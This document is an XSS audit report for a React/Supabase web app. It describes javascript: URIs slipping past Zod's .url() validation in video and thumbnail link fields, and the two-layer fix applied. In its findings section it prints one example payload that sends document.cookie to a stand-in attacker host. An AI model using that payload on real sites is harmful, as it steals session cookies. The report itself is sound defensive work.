# XSS Security Report

## Status: HIGH (2 findings, fixed)

## Findings

- `grep -r "dangerouslySetInnerHTML"` across `src/` returns zero matches — the app never bypasses React's default JSX auto-escaping anywhere. This closes off the most common XSS vector by default.
- Went further and checked every `<a href={...}>` / `<Link href={...}>` bound to a non-literal value, since an href isn't auto-escaped the way text content is — a `javascript:` URI in an href executes on click regardless of React's text escaping.

**Real finding:** two form fields validated with plain `z.string().url()` and later rendered as clickable links — `videoUrl` on return proof uploads (`features/orders/returns.ts`, rendered as `<a href={r.video_url}>` on the seller returns dashboard) and `videoUrl`/`thumbnailUrl` on creator reels (`features/creator/actions.ts`, rendered in `reel-card.tsx`). Confirmed by direct test that Zod's `.url()` validator **accepts `javascript:` and `data:` URIs** — they're syntactically valid URLs per the WHATWG spec, which is all `.url()` checks. Both fields are set via `"use server"` actions invoked from client components (`return-form.tsx`, the reel publish form), so — consistent with several other findings in this audit — the actual constraint is whatever the schema allows, not just what the intended upload UI produces. A malicious buyer/creator could submit `javascript:fetch('https://attacker.example/steal?c='+document.cookie)` as the URL; since the Supabase session cookie is `httpOnly: false` by design (see CSRF report), a seller or viewer clicking that "proof"/"play" link would have their session cookie exfiltrated.

## What's at risk

Session hijacking against whoever clicks the malicious link (a seller reviewing return proof, or anyone viewing a reel) — the cookie isn't httpOnly, so `document.cookie` in the injected script would include the session token.

## What's already secure

Zero `dangerouslySetInnerHTML` usage anywhere; React's default escaping handles all ordinary text rendering (product titles, reviews, bios, notes, etc.) correctly without any extra work.

## Recommendations

**Applied, two layers:**
1. **Schema-level (primary):** both Zod schemas now use a shared `httpUrl` validator that adds `.refine((v) => /^https?:\/\//i.test(v))` on top of `.url()`, rejecting any non-http(s) scheme before it's ever stored.
2. **Render-level (defense in depth):** added `src/lib/utils/safe-url.ts` (`isSafeHttpUrl`) and used it as a guard at both render sites, so even a value that somehow reached the database without going through the schema (a future code path, a manual DB edit, a migration) can't render as a clickable link unless it's actually http(s).

Both fixes verified with `npx tsc --noEmit` — clean.
